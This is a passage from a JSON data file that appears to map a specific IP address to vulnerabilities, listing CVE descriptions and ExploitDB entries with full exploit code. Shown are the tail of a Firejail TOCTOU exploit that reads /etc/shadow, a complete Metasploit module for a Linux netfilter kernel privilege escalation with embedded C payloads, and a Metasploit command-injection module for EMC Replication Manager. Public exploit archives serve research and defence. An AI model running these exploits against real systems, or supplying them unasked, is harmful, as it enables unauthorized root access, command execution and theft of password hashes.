file\r\n                        FILE *fp = fopen(dest_fname, \"w\");\r\n                        if (!fp) {\r\n                                fprintf(stderr, \"Error: cannot create %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                        fclose(fp);\r\n                }\r\n                else {\r\n                        if (access(dest_fname, W_OK) == -1) {\r\n                                fprintf(stderr, \"Error: cannot write %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                }\r\n                // copy file\r\n                EUID_ROOT();\r\n                copy_file(src_fname, dest_fname, getuid(), getgid(), 0644);\r\n                printf(\"Transfer complete\\n\");\r\n                EUID_USER();\r\n        }\r\n\r\n        free(fname);\r\n        free(rootdir);\r\n\r\n        exit(0);\r\n}\r\n~~~~\r\n\r\n\r\n\r\n### Code: src/firejail/util.c\r\n~~~~\r\nint copy_file(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode) {\r\n        assert(srcname);\r\n        assert(destname);\r\n\r\n        // open source\r\n        int src = open(srcname, O_RDONLY);\r\n        if (src < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", srcname);\r\n                return -1;\r\n        }\r\n\r\n        // open destination\r\n        int dst = open(destname, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\r\n        if (dst < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", destname);\r\n                close(src);\r\n                return -1;\r\n        }\r\n\r\n        // copy\r\n        ssize_t len;\r\n        static const int BUFLEN = 1024;\r\n        unsigned char buf[BUFLEN];\r\n        while ((len = read(src, buf, BUFLEN)) > 0) {\r\n                int done = 0;\r\n                while (done != len) {\r\n                        int rv = write(dst, buf + done, len - done);\r\n                        if (rv == -1) {\r\n                                close(src);\r\n                                close(dst);\r\n                                return -1;\r\n                        }\r\n\r\n                        done += rv;\r\n                }\r\n        }\r\n\r\n        if (fchown(dst, uid, gid) == -1)\r\n                errExit(\"fchown\");\r\n        if (fchmod(dst, mode) == -1)\r\n                errExit(\"fchmod\");\r\n\r\n        close(src);\r\n        close(dst);\r\n        return 0;\r\n}\r\n</snip>\r\n~~~~\r\n\r\n## Testing \r\n\r\n### Our Dockerfile\r\n\r\n~~~~\r\nFROM ubuntu:latest\r\n\r\nENV wdir /root/firejail\r\n\r\nRUN apt-get update && apt-get install -y git gcc make\r\nRUN useradd -ms /bin/bash daniel && echo \"daniel:password\" | chpasswd\r\nRUN git clone https://github.com/netblue30/firejail.git ${wdir}\r\nWORKDIR ${wdir}\r\nRUN git reset --hard 81467143ee9c47d9c90e97fb55baf2d47702d372\r\nRUN ./configure && make && make install\r\n~~~~\r\n\r\n### Our exploit\r\n\r\nThis will exploit the --get command to read /etc/shadow and print back to the console. Just copy and paste into your shell:\r\n\r\n~~~~\r\n#dropper\r\ncat > gexp.sh <<GUEST_JAIL_SCRIPT_EOF\r\nmkdir -p /tmp/exploit\r\ncat > /tmp/exploit/gaolbreak.c <<TOCTOU_POC_END\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n\r\nint main(int argc, char **argv)\r\n{\r\n    char *fl = \"/etc/shadow\";\r\n\r\n    if(argc > 1) {\r\n        fl = argv[1];\r\n    }\r\n\r\n    while(1) {\r\n        int fd = open(\"owned\", O_CREAT | O_RDWR, 0777);\r\n        if(fd == -1) {\r\n            perror(\"open\");\r\n            exit(1);\r\n        }\r\n        close(fd);\r\n        remove(\"owned\");\r\n        symlink(fl, \"owned\");\r\n        remove(\"owned\");\r\n    }\r\n}\r\nTOCTOU_POC_END\r\ncd /tmp/exploit\r\ngcc ./gaolbreak.c -o gaolbreak\r\n# XXX: change argv[1] to whatever you want\r\n./gaolbreak /etc/shadow\r\nGUEST_JAIL_SCRIPT_EOF\r\n\r\n# run the dropper (symlink attack) in a jail\r\nchmod +x ./gexp.sh\r\nfirejail --noprofile --force --name=el ./gexp.sh &\r\n\r\n# win race using the vulnerable 'firejail --get' command.\r\nmkdir exploitel\r\ncd exploitel\r\nwhile [ 1 ] ; do nice -n 19 firejail --get=$(pgrep -f '^firejail.*--name=el' -n) /tmp/exploit/owned >/dev/null 2>&1; cat owned 2>/dev/null; done\r\n~~~~",
                "description": "Firejail - Local Privilege Escalation",
                "author": "Daniel Hodson",
                "_id": 41022,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2017-01-09T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \"msf/core\"\r\n\r\nclass MetasploitModule < Msf::Exploit::Local\r\n  Rank = GoodRanking\r\n\r\n  include Msf::Post::File\r\n  include Msf::Exploit::EXE\r\n  include Msf::Exploit::FileDropper\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n        'Name'           => 'Linux Kernel 4.6.3 Netfilter Privilege Escalation',\r\n        'Description'    => %q{\r\n          This module attempts to exploit a netfilter bug on Linux Kernels befoe 4.6.3, and currently\r\n          only works against Ubuntu 16.04 (not 16.04.1) with kernel\r\n          4.4.0-21-generic.\r\n          Several conditions have to be met for successful exploitation:\r\n          Ubuntu:\r\n          1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such)\r\n          2. libc6-dev-i386 (ubuntu), glibc-devel.i686  & libgcc.i686 (fedora) needs to be installed to compile\r\n          Kernel 4.4.0-31-generic and newer are not vulnerable.\r\n\r\n          We write the ascii files and compile on target instead of locally since metasm bombs for not\r\n          having cdefs.h (even if locally installed)\r\n        },\r\n        'License'        => MSF_LICENSE,\r\n        'Author'         =>\r\n          [\r\n            'h00die <mike@stcyrsecurity.com>',  # Module\r\n            'vnik'                         # Discovery\r\n          ],\r\n        'DisclosureDate' => 'Jun 03 2016',\r\n        'Platform'       => [ 'linux'],\r\n        'Arch'           => [ ARCH_X86 ],\r\n        'SessionTypes'   => [ 'shell', 'meterpreter' ],\r\n        'Targets'        =>\r\n          [\r\n            [ 'Ubuntu', { } ]\r\n            #[ 'Fedora', { } ]\r\n          ],\r\n        'DefaultTarget'  => 0,\r\n        'References'     =>\r\n          [\r\n            [ 'EDB', '40049'],\r\n            [ 'CVE', '2016-4997'],\r\n            [ 'URL', 'http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c']\r\n          ]\r\n      ))\r\n    register_options(\r\n      [\r\n        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),\r\n        OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 180 ]),\r\n        OptBool.new('REEXPLOIT', [ true, 'desc already ran, no need to re-run, skip to running pwn',false]),\r\n        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])\r\n      ], self.class)\r\n  end\r\n\r\n  def check\r\n    def iptables_loaded?()\r\n      # user@ubuntu:~$ cat /proc/modules | grep ip_tables\r\n      # ip_tables 28672 1 iptable_filter, Live 0x0000000000000000\r\n      # x_tables 36864 2 iptable_filter,ip_tables, Live 0x0000000000000000\r\n      vprint_status('Checking if ip_tables is loaded in kernel')\r\n      if target.name == \"Ubuntu\"\r\n        iptables = cmd_exec('cat /proc/modules | grep ip_tables')\r\n        if iptables.include?('ip_tables')\r\n          vprint_good('ip_tables.ko is loaded')\r\n        else\r\n          print_error('ip_tables.ko is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('ip_tables')\r\n      elsif target.name == \"Fedora\"\r\n        iptables = cmd_exec('cat /proc/modules | grep iptable_raw')\r\n        if iptables.include?('iptable_raw')\r\n          vprint_good('iptable_raw is loaded')\r\n        else\r\n          print_error('iptable_raw is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('iptable_raw')\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    def shemsham_installed?()\r\n      # we want this to be false.\r\n      vprint_status('Checking if shem or sham are installed')\r\n      shemsham = cmd_exec('cat /proc/cpuinfo')\r\n      if shemsham.include?('shem')\r\n        print_error('shem installed, system not vulnerable.')\r\n      elsif shemsham.include?('sham')\r\n        print_error('sham installed, system not vulnerable.')\r\n      else\r\n        vprint_good('shem and sham not present.')\r\n      end\r\n      return (shemsham.include?('shem') or shemsham.include?('sham'))\r\n    end\r\n\r\n    if iptables_loaded?() and not shemsham_installed?()\r\n      return CheckCode::Appears\r\n    else\r\n      return CheckCode::Safe\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    # first thing we need to do is determine our method of exploitation: compiling realtime, or droping a pre-compiled version.\r\n    def has_prereqs?()\r\n      vprint_status('Checking if 32bit C libraries, gcc-multilib, and gcc are installed')\r\n      if target.name == \"Ubuntu\"\r\n        lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')\r\n        if lib.include?('install')\r\n          vprint_good('libc6-dev-i386 is installed')\r\n        else\r\n          print_error('libc6-dev-i386 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = cmd_exec('dpkg --get-selections | grep ^gcc-multilib')\r\n        if multilib.include?('install')\r\n          vprint_good('gcc-multilib is installed')\r\n        else\r\n          print_error('gcc-multilib is not installed.  Compiling will fail.')\r\n        end\r\n        gcc = cmd_exec('which gcc')\r\n        if gcc.include?('gcc')\r\n          vprint_good('gcc is installed')\r\n        else\r\n          print_error('gcc is not installed.  Compiling will fail.')\r\n        end\r\n        return gcc.include?('gcc') && lib.include?('install') && multilib.include?('install')\r\n      elsif target.name == \"Fedora\"\r\n        lib = cmd_exec('dnf list installed | grep -E \\'(glibc-devel.i686|libgcc.i686)\\'')\r\n        if lib.include?('glibc')\r\n          vprint_good('glibc-devel.i686 is installed')\r\n        else\r\n          print_error('glibc-devel.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        if lib.include?('libgcc')\r\n          vprint_good('libgcc.i686 is installed')\r\n        else\r\n          print_error('libgcc.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = false #not implemented\r\n        gcc = false #not implemented\r\n        return (lib.include?('glibc') && lib.include?('libgcc')) && gcc && multilib\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    compile = false\r\n    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'\r\n      if has_prereqs?()\r\n        compile = true\r\n        vprint_status('Live compiling exploit on system')\r\n      else\r\n        vprint_status('Dropping pre-compiled exploit on system')\r\n      end\r\n    end\r\n    if check != CheckCode::Appears\r\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\r\n    end\r\n\r\n    desc_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    env_ready_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    pwn_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    payload_file = rand_text_alpha(8)\r\n    payload_path = \"#{datastore[\"WritableDir\"]}/#{payload_file}\"\r\n\r\n    # direct copy of code from exploit-db, except removed the check for shem/sham and ip_tables.ko since we can do that in the check area here\r\n    # removed         #include <netinet/in.h> per busterb comment in PR 7326\r\n    decr = %q{\r\n      #define _GNU_SOURCE\r\n      #include <stdio.h>\r\n      #include <stdlib.h>\r\n      #include <string.h>\r\n      #include <unistd.h>\r\n      #include <sched.h>\r\n      #include <netinet/in.h>\r\n      #include <linux/sched.h>\r\n      #include <errno.h>\r\n      #include <sys/types.h>\r\n      #include <sys/socket.h>\r\n      #include <sys/ptrace.h>\r\n      #include <net/if.h>\r\n      #include <linux/netfilter_ipv4/ip_tables.h>\r\n      #include <linux/netlink.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n\r\n      #define MALLOC_SIZE 66*1024\r\n\r\n      int decr(void *p) {\r\n          int sock, optlen;\r\n          int ret;\r\n          void *data;\r\n          struct ipt_replace *repl;\r\n          struct ipt_entry *entry;\r\n          struct xt_entry_match *ematch;\r\n          struct xt_standard_target *target;\r\n          unsigned i;\r\n\r\n          sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);\r\n\r\n          if (sock == -1) {\r\n                  perror(\"socket\");\r\n                  return -1;\r\n          }\r\n\r\n          data = malloc(MALLOC_SIZE);\r\n\r\n          if (data == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          memset(data, 0, MALLOC_SIZE);\r\n\r\n          repl = (struct ipt_replace *) data;\r\n          repl->num_entries = 1;\r\n          repl->num_counters = 1;\r\n          repl->size = sizeof(*repl) + sizeof(*target) + 0xffff;\r\n          repl->valid_hooks = 0;\r\n\r\n          entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));\r\n          entry->target_offset = 74; // overwrite target_offset\r\n          entry->next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);\r\n\r\n          ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));\r\n\r\n          strcpy(ematch->u.user.name, \"icmp\");\r\n          void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);\r\n          uint64_t *me = (uint64_t *)(kmatch + 0x58);\r\n          *me = 0xffffffff821de10d; // magic number!\r\n\r\n          uint32_t *match = (uint32_t *)((char *)&ematch->u.kernel.match + 4);\r\n          *match = (uint32_t)kmatch;\r\n\r\n          ematch->u.match_size = (short)0xffff;\r\n\r\n          target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);\r\n          uint32_t *t = (uint32_t *)target;\r\n          *t = (uint32_t)kmatch;\r\n\r\n          printf(\"[!] Decrementing the refcount. This may take a while...\\n\");\r\n          printf(\"[!] Wait for the \\\"Done\\\" message (even if you'll get the prompt back).\\n\");\r\n\r\n          for (i = 0; i < 0xffffff/2+1; i++) {\r\n              ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);\r\n          }\r\n\r\n          close(sock);\r\n          free(data);\r\n          printf(\"[+] Done! Now run ./pwn\\n\");\r\n\r\n          return 0;\r\n      }\r\n\r\n      int main(void) {\r\n          void *stack;\r\n          int ret;\r\n\r\n          printf(\"netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\\n\");\r\n\r\n          ret = unshare(CLONE_NEWUSER);\r\n\r\n          if (ret == -1) {\r\n              perror(\"unshare\");\r\n              return -1;\r\n          }\r\n\r\n          stack = (void *) malloc(65536);\r\n\r\n          if (stack == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          clone(decr, stack + 65536, CLONE_NEWNET, NULL);\r\n\r\n          sleep(1);\r\n\r\n          return 0;\r\n      }\r\n    }\r\n\r\n    # direct copy of code from exploit-db\r\n    pwn = %q{\r\n      #include <stdio.h>\r\n      #include <string.h>\r\n      #include <errno.h>\r\n      #include <unistd.h>\r\n      #include <stdint.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n      #include <assert.h>\r\n\r\n      #define MMAP_ADDR 0xff814e3000\r\n      #define MMAP_OFFSET 0xb0\r\n\r\n      typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);\r\n      typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);\r\n\r\n      void __attribute__((regparm(3))) privesc() {\r\n          commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;\r\n          prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;\r\n          commit_creds(prepare_kernel_cred((uint64_t)NULL));\r\n      }\r\n\r\n      int main() {\r\n          void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);\r\n          assert(payload == (void *)MMAP_ADDR);\r\n\r\n          void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);\r\n\r\n          memset(shellcode, 0, 0x300000);\r\n\r\n          void *ret = memcpy(shellcode, &privesc, 0x300);\r\n          assert(ret == shellcode);\r\n\r\n          printf(\"[+] Escalating privs...\\n\");\r\n\r\n          int fd = open(\"/dev/ptmx\", O_RDWR);\r\n          close(fd);\r\n\r\n          assert(!getuid());\r\n\r\n          printf(\"[+] We've got root!\");\r\n\r\n          return execl(\"/bin/bash\", \"-sh\", NULL);\r\n      }\r\n    }\r\n\r\n    # the original code printed a line.  However, this is hard to detect due to threading.\r\n    # so instead we can write a file in /tmp to catch.\r\n    decr.gsub!(/printf\\(\"\\[\\+\\] Done\\! Now run \\.\\/pwn\\\\n\"\\);/,\r\n               \"int fd2 = open(\\\"#{env_ready_file}\\\", O_RDWR|O_CREAT, 0777);close(fd2);\" )\r\n\r\n    # patch in to run our payload\r\n    pwn.gsub!(/execl\\(\"\\/bin\\/bash\", \"-sh\", NULL\\);/,\r\n               \"execl(\\\"#{payload_path}\\\", NULL);\")\r\n\r\n    def pwn(payload_path, pwn_file, pwn, compile)\r\n      # lets write our payload since everythings set for priv esc\r\n      vprint_status(\"Writing payload to #{payload_path}\")\r\n      write_file(payload_path, generate_payload_exe)\r\n      cmd_exec(\"chmod 555 #{payload_path}\")\r\n      register_file_for_cleanup(payload_path)\r\n\r\n      # now lets drop part 2, and finish up.\r\n      rm_f pwn_file\r\n      if compile\r\n        print_status \"Writing pwn executable to #{pwn_file}.c\"\r\n        rm_f \"#{pwn_file}.c\"\r\n        write_file(\"#{pwn_file}.c\", pwn)\r\n        cmd_exec(\"gcc #{pwn_file}.c -O2 -o #{pwn_file}\")\r\n        register_file_for_cleanup(\"#{pwn_file}.c\")\r\n      else\r\n        print_status \"Writing pwn executable to #{pwn_file}\"\r\n        write_file(pwn_file, pwn)\r\n      end\r\n      register_file_for_cleanup(pwn_file)\r\n      cmd_exec(\"chmod +x #{pwn_file}; #{pwn_file}\")\r\n    end\r\n\r\n    if not compile # we need to override with our pre-created binary\r\n      # pwn file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-pwn.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      pwn = fd.read(fd.stat.size)\r\n      fd.close\r\n      # desc file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-decr.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      decr = fd.read(fd.stat.size)\r\n      fd.close\r\n\r\n      # overwrite the hardcoded variable names in the compiled versions\r\n      env_ready_file = '/tmp/okDjTFSS'\r\n      payload_path = '/tmp/2016_4997_payload'\r\n    end\r\n\r\n    # check for shortcut\r\n    if datastore['REEXPLOIT']\r\n      pwn(payload_path, pwn_file, pwn, compile)\r\n    else\r\n      rm_f desc_file\r\n      if compile\r\n        print_status \"Writing desc executable to #{desc_file}.c\"\r\n        rm_f \"#{desc_file}.c\"\r\n        write_file(\"#{desc_file}.c\", decr)\r\n        register_file_for_cleanup(\"#{desc_file}.c\")\r\n        output = cmd_exec(\"gcc #{desc_file}.c -m32 -O2 -o #{desc_file}\")\r\n      else\r\n        write_file(desc_file, decr)\r\n      end\r\n      rm_f env_ready_file\r\n      register_file_for_cleanup(env_ready_file)\r\n      #register_file_for_cleanup(desc_file)\r\n      if not file_exist?(desc_file)\r\n        vprint_error(\"gcc failure output: #{output}\")\r\n        fail_with(Failure::Unknown, \"#{desc_file}.c failed to compile\")\r\n      end\r\n      if target.name == \"Ubuntu\"\r\n        vprint_status \"Executing #{desc_file}, may take around 35s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      elsif target.name == \"Fedora\"\r\n        vprint_status \"Executing #{desc_file}, may take around 80s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      end\r\n      cmd_exec(\"chmod +x #{desc_file}; #{desc_file}\")\r\n      sec_waited = 0\r\n\r\n      until sec_waited > datastore['MAXWAIT'] do\r\n        Rex.sleep(1)\r\n        if sec_waited % 10 == 0\r\n          vprint_status(\"Waited #{sec_waited}s so far\")\r\n        end\r\n\r\n        if file_exist?(env_ready_file)\r\n          print_good(\"desc finished, env ready.\")\r\n          pwn(payload_path, pwn_file, pwn, compile)\r\n          return\r\n        end\r\n        sec_waited +=1\r\n      end\r\n    end\r\n  end\r\nend",
                "description": "Linux Kernel 4.6.3 (x86) - 'Netfilter' Local Privilege Escalation (Metasploit)",
                "author": "Metasploit",
                "_id": 40435,
                "source": "ExploitDB",
                "platform": "linux_x86",
                "date": "2016-09-27T00:00:00+00:00",
                "cve": [
                    "CVE-2016-4997"
                ],
                "type": "local",
                "port": 0
            }
        ]
    },
    "152.1.38.224": {
        "CVE-2011-5000": [
            {
                "source": "CVE",
                "_id": "2011-5000",
                "description": "The ssh_gssapi_parse_ename function in gss-serv.c in OpenSSH 5.8 and earlier, when gssapi-with-mic authentication is enabled, allows remote authenticated users to cause a denial of service (memory consumption) via a large value in a certain length field.  NOTE: there may be limited scenarios in which this issue is relevant.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-5000"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4487",
                "description": "SQL injection vulnerability in Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allows remote attackers to execute arbitrary SQL commands via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4487"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-2581",
                "description": "The ACL implementation in Cisco NX-OS 5.0(2) and 5.0(3) before 5.0(3)N2(1) on Nexus 5000 series switches, and NX-OS before 5.0(3)U1(2a) on Nexus 3000 series switches, does not properly handle comments in conjunction with deny statements, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by sending packets, aka Bug IDs CSCto09813 and CSCtr61490.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-2581"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4486",
                "description": "Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allow remote attackers to cause a denial of service (device reload) via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4486"
                ],
                "msb": []
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = GreatRanking\r\n\r\n  include Msf::Exploit::Remote::Tcp\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      'Name'           => 'EMC Replication Manager Command Execution',\r\n      'Description'    => %q{\r\n        This module exploits a remote command-injection vulnerability in EMC Replication Manager\r\n        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an\r\n        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected\r\n        products are EMC Replication Manager < 5.3. This module has been successfully tested\r\n        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft\r\n        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested\r\n        against these products.\r\n      },\r\n      'Author'         =>\r\n        [\r\n          'Unknown', #Initial discovery\r\n          'Davy Douhine' #MSF module\r\n        ],\r\n      'License'        => MSF_LICENSE,\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2011-0647' ],\r\n          [ 'OSVDB', '70853' ],\r\n          [ 'BID', '46235' ],\r\n          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],\r\n          [ 'ZDI', '11-061' ]\r\n        ],\r\n      'DisclosureDate' => 'Feb 07 2011',\r\n      'Platform'       => 'win',\r\n      'Arch'           => ARCH_X86,\r\n      'Payload'        =>\r\n        {\r\n          'Space'       => 4096,\r\n          'DisableNops' => true\r\n        },\r\n      'Targets'        =>\r\n        [\r\n          # Tested on Windows XP and Windows 2003\r\n          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]\r\n        ],\r\n      'CmdStagerFlavor' => 'vbs',\r\n      'DefaultOptions' =>\r\n        {\r\n          'WfsDelay' => 5\r\n        },\r\n      'DefaultTarget'  => 0,\r\n      'Privileged'     => true\r\n      ))\r\n\r\n    register_options(\r\n      [\r\n        Opt::RPORT(6542)\r\n      ], self.class)\r\n  end\r\n\r\n  def exploit\r\n    execute_cmdstager({:linemax => 5000})\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n    connect\r\n    hello = \"1HELLOEMC00000000000000000000000\"\r\n    vprint_status(\"Sending hello...\")\r\n    sock.put(hello)\r\n    result = sock.get_once || ''\r\n    if result =~ /RAWHELLO/\r\n      vprint_good(\"Expected hello response\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to hello the server\")\r\n    end\r\n\r\n    start_session = \"EMC_Len0000000136<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><ir_message ir_sessionId=0000 ir_type=\\\"ClientStartSession\\\" <ir_version>1</ir_version></ir_message>\"\r\n    vprint_status(\"Starting session...\")\r\n    sock.put(start_session)\r\n    result = sock.get_once || ''\r\n    if result =~ /EMC/\r\n      vprint_good(\"A session has been created. Good.\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to create the session\")\r\n    end\r\n\r\n    run_prog = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?> \"\r\n    run_prog << \"<ir_message ir_sessionId=\\\"01111\\\" ir_requestId=\\\"00000\\\" ir_type=\\\"RunProgram\\\" ir_status=\\\"0\\\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>\"\r\n    run_prog << \"<ir_runProgramAppInfo><?xml version=\"1.0\" encoding=\"UTF-8\"?> <ir_message ir_sessionId=\"00000\" ir_requestId=\"00000\" \"\r\n    run_prog << \"ir_type=\"App Info\" ir_status=\"0\"><IR_groupEntry IR_groupType=\"anywriter\"  IR_groupName=\"CM1109A1\"  IR_groupId=\"1\" \"\r\n    run_prog << \"><?xml version=\"1.0\" encoding=\"UTF-8\"?\t> <ir_message ir_sessionId=\"00000\" \"\r\n    run_prog << \"ir_requestId=\"00000\"ir_type=\"App Info\" ir_status=\"0\"><aa_anywriter_ccr_node>CM1109A1\"\r\n    run_prog << \"</aa_anywriter_ccr_node><aa_anywriter_fail_1018>0</aa_anywriter_fail_1018><aa_anywriter_fail_1019>0\"\r\n    run_prog << \"</aa_anywriter_fail_1019><aa_anywriter_fail_1022>0</aa_anywriter_fail_1022><aa_anywriter_runeseutil>1\"\r\n    run_prog << \"</aa_anywriter_runeseutil><aa_anywriter_ccr_role>2</aa_anywriter_ccr_role><aa_anywriter_prescript>\"\r\n    run_prog << \"</aa_anywriter_prescript><aa_anywriter_postscript></aa_anywriter_postscript><aa_anywriter_backuptype>1\"\r\n    run_prog << \"</aa_anywriter_backuptype><aa_anywriter_fail_447>0</aa_anywriter_fail_447><aa_anywriter_fail_448>0\"\r\n    run_prog << \"</aa_anywriter_fail_448><aa_exchange_ignore_all>0</aa_exchange_ignore_all><aa_anywriter_sthread_eseutil>0&amp\"\r\n    run_prog << \";lt;/aa_anywriter_sthread_eseutil><aa_anywriter_required_logs>0</aa_anywriter_required_logs><aa_anywriter_required_logs_path\"\r\n    run_prog << \"></aa_anywriter_required_logs_path><aa_anywriter_throttle>1</aa_anywriter_throttle><aa_anywriter_throttle_ios>300\"\r\n    run_prog << \"</aa_anywriter_throttle_ios><aa_anywriter_throttle_dur>1000</aa_anywriter_throttle_dur><aa_backup_username>\"\r\n    run_prog << \"</aa_backup_username><aa_backup_password></aa_backup_password><aa_exchange_checksince>1335208339\"\r\n    run_prog << \"</aa_exchange_checksince> </ir_message></IR_groupEntry> </ir_message></ir_runProgramAppInfo>\"\r\n    run_prog << \"<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>\"\r\n    run_prog_header = \"EMC_Len000000\"\r\n    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog\r\n\r\n    vprint_status(\"Executing command....\")\r\n    sock.put(run_prog_packet)\r\n    sock.get_once(-1, 1)\r\n\r\n    end_string = Rex::Text.rand_text_alpha(rand(10)+32)\r\n    sock.put(end_string)\r\n    sock.get_once(-1, 1)\r\n    disconnect\r\n\r\n  end\r\nend",
                "description": "EMC Replication Manager < 5.3 - Command Execution (Metasploit)",
                "author": "Metasploit",
                "_id": 41704,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-02-27T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
